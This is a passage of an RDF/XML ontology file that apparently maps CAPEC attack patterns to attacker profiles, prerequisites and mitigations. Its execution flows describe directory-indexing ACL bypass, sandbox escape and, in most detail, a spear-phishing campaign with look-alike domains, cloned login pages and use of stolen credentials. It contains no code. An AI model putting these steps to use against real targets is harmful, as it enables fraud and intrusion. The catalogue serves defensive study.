    <j.0:makes rdf:resource="http://krstProj.com/capec#attack497"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::353::118::119::74::20::680::697::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted client software communicates with an external server.::The targeted client software has a buffer overflow vulnerability.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To achieve a denial of service  an attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap requires a more in-depth knowledge and higher skill level.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker184">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#421"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack184"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XPath expression. Characters such as a single-quote(&apos;) or operators such as or (-)  and (&amp;) and such should be filtered if the application does not expect them in the context in which they appear. If such content cannot be filtered  it must at least be properly escaped to avoid them being interpreted as part of XPath expressions.::Use of parameterized XPath queries - Parameterization causes the input to be restricted to certain domains  such as strings or integers  and any input outside such domains is considered invalid and the query fails.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack229"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.::2. Preventing with .htaccess in Apache web server: In .htaccess  write Options-indexes.::3. Suppressing error messages: using error 403 Forbidden message exactly like error 404 Not Found message.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack43">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#127">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:54::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Directory Indexing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::424::425::288::285::732::276::693::721::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Directory Discovery) Use a method  either manual  scripted  or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.TECHNIQUE:Send requests to the web server for common directory names:TECHNIQUE:If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.:TECHNIQUE:Search for uncommon or potentially user created directories that may be present.::STEP:2:PHASE:Experiment:DESCRIPTION:(Iteratively explore directory/file structures) The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methodsTECHNIQUE:Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.:TECHNIQUE:Use a browser to manually explore the website by issuing a request ending the URL in a slash &apos;/&apos;.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance  appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.:TECHNIQUE:Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a / request::STEP:3:PHASE:Exploit:DESCRIPTION:(Read directories or files which are not intended for public viewing.) The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methodsTECHNIQUE:Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a / request:TECHNIQUE:Try other known exploits to elevate privileges sufficient to bypass protected directories.:TECHNIQUE:List the files in the directory by issuing a request with the URL ending in a / slash.:TECHNIQUE:Access the files via direct URL and capture contents.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance  appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Information Leakage::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.::Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.::Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.::Configuration: Get latest updates for the computer.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack445">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#237">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:68::NATURE:ChildOf:CAPEC ID:480::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Escaping a Sandbox by Calling Signed Code in Another Language"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::693::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Probing) The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.TECHNIQUE:The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.::STEP:2:PHASE:Explore:DESCRIPTION:(Analysis) The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.TECHNIQUE:The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.::STEP:3:PHASE:Experiment:DESCRIPTION:(Verify the exploitable security weaknesses) The attacker tries to craft malicious signed code from another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.TECHNIQUE:The attacker tries to explore the security weaknesses by calling malicious signed code from another language allowed by the sandbox.::STEP:4:PHASE:Exploit:DESCRIPTION:(Exploit the security weaknesses in the standard libraries) The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox  thus escaping the sandbox.TECHNIQUE:The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker72">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#308">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#UDP Scan"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack72">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#308"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to send UDP datagrams to a host and receive ICMP error messages from that host. In cases where particular types of ICMP messaging is disallowed  the reliability of UDP scanning drops off sharply.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner  or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Do not rely solely on user-controllable locations  such as cookies or URL parameters  to maintain user state.::Avoid sensitive information  such as usernames or authentication and authorization information  in user-controllable locations.::Sensitive information that is part of the user state must be appropriately protected to ensure confidentiality and integrity at each request.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack428">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#74">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Manipulating User State"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::372::371::315::353::693::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Adversary determines the nature of state management employed by the application. This includes determining the location (client-side  server-side or both) and possibly the items stored as part of user state.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary now tries to modify the user state contents (possibly blindly if the contents are encrypted or otherwise obfuscated) and observe the effects of this change on the application.::STEP:3:PHASE:Exploit:DESCRIPTION:Having determined the information stored in the user state and the possible ways to modify it  the adversary can violate it in order to perform illegitimate actions.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker185">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#418"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack185"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Upgrade the SIM card to use the state-of-the-art AES or the somewhat outdated 3DES algorithm for OTA.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack415"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker183">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#300"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack183"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires logical access to the target&apos;s network in order to carry out this type of attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary requires a network mapping/scanning tool  or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Restrict access to private keys from non-supervisory accounts Restrict access to administrative personnel and processes only Ensure all remote methods are secured Ensure all services are patched and up to date::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack312">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#474">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:473::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Signature Spoofing by Key Theft"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::522::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker71">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#306"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack71"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::TCP Window scanning requires the use of raw sockets  and thus cannot be performed from some Windows systems (Windows XP SP 2  for example). On Unix and Linux  raw socket manipulations require root privileges.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner  or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker182">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#629"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack182"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Knowledge of the affected system  including what devices are connected to it  as well as knowledge of how to extract information from these devices.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack11">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#646">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Peripheral Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Restrict the permission to modify the entries in the configuration file.::Implementation: Check the integrity of the dynamically linked libraries before use them.::Implementation: Use obfuscation and other techniques to prevent reverse engineering the libraries.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack92">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#159">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:154::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Redirect Access to Libraries"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::706::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker74">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#498"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack74"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires physical access to a device to either excavate the image files (potentially by leveraging a Jailbreak) or view the screenshots through the multitasking switcher (by double tapping the home button on the device).::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker181">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#163">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:98::NATURE:CanFollow:CAPEC ID:116::NATURE:CanFollow:CAPEC ID:406::NATURE:CanFollow:CAPEC ID:407::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Spear Phishing"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack181">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#163"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Obtain useful contextual detailed information about the targeted user or organization) An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.TECHNIQUE:Conduct web searching research of target. See also: CAPEC-118.:TECHNIQUE:Identify trusted associates  colleagues and friends of target. See also: CAPEC-118.:TECHNIQUE:Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.:TECHNIQUE:Collect social information via dumpster diving. See also: CAPEC-406.:TECHNIQUE:Collect social information via traditional sources. See also: CAPEC-118.:TECHNIQUE:Collect social information via Non-traditional sources. See also: CAPEC-118.::STEP:2:PHASE:Experiment:DESCRIPTION:(Optional: Obtain domain name and certificate to spoof legitimate site) This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks  and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate site&apos;s domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i  instead of a lower case L).:TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:3:PHASE:Experiment:DESCRIPTION:(Optional: Explore legitimate website and create duplicate) An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site&apos;s look at feel  but contain completely new content.::STEP:4:PHASE:Experiment:DESCRIPTION:(Optional: Build variants of the website with very specific user information e.g.  living area  etc.) Once the adversary has his website which duplicates a legitimate website  he needs to build very custom user related information in it. For example  he could create multiple variants of the website which would target different living area users by providing information such as local news  local weather  etc. so that the user believes this is a new feature from the website.TECHNIQUE:Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim.::STEP:5:PHASE:Exploit:DESCRIPTION:(Convince user to enter sensitive information on adversary&apos;s site.) An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary&apos;s website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.TECHNIQUE:Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.:TECHNIQUE:Place phishing link in post to online forum.::STEP:6:PHASE:Exploit:DESCRIPTION:(Use stolen credentials to log into legitimate site) Once the adversary captures some sensitive information through phishing (login credentials  credit card information  etc.) the adversary can leverage this information. For instance  the adversary can use the victim&apos;s login credentials to log into their bank account and transfer money to an account of their choice.TECHNIQUE:Log in to the legitimate site using another user&apos;s supplied credentials.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Information Leakage::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges:NOTE:Accountability Authentication Authorization Non-Repudiation Gain Privileges Privilege Escalation::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Data Modification::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::None. Any user can be targeted by a Spear Phishing attack.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Spear phishing attacks require specific knowledge of the victims being targeted  such as which bank is being used by the victims  or websites they commonly log into (Google  Facebook  etc).:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::An adversay must have the ability communicate their phishing scheme to the victims (via email  instance message  etc.)  as well as a website or other platform for victims to enter personal information into.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Perform white list rather than black list input validation.::Canonicalize all data prior to validation.::Take an iterative approach to input validation (defense in depth).::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack419"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure the application is using parsing and data display techniques that will accurately display control characters  international symbols and markings  and ultimately recognize potential homograph attacks.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack255">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#476">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:473::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Signature Spoofing by Misrepresentation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::290::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker409">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#68">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:233::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Subvert Code-signing Facilities"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack409">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#68"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::325::328::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::325::328::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A framework-based language that supports code signing (such as  and most commonly  Java or .NET)::Deployed code that has been signed by its authoring vendor  or a partner.::The attacker will  for most circumstances  also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security  except when explicitly indicated.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Subverting code signing is not a trivial activity. Most code signing and verification schemes are based on use of cryptography and the attacker needs to have an understanding of these cryptographic operations in good detail. Additionally the attacker also needs to be aware of the way memory is assigned and accessed by the container since  often  the only way to subvert code signing would be to patch the code in memory. Finally  a knowledge of the platform specific mechanisms of signing and verifying code is a must.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
